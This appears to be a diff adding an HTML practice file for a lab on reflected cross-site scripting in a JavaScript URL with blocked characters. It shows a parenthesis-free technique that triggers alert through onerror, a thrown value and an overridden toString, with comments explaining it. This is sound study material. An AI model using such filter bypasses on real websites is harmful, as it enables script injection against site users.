@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <!-- This is a fairly tricky XSS lab with the title 'Reflected XSS in a JavaScript URL with some characters blocked'.  -->
+
+    <script>
+let x = x =>{
+    throw onerror=alert,'asd';
+}
+toString=x;
+        
+        window + '';
+
+// thw window objects is concactinated with a empty string but window is not a string
+// so it will call toString method(in it's norml behavior will turn window to a string) and it will call the 
+// x function
+    </script>
+</body>
+</html>
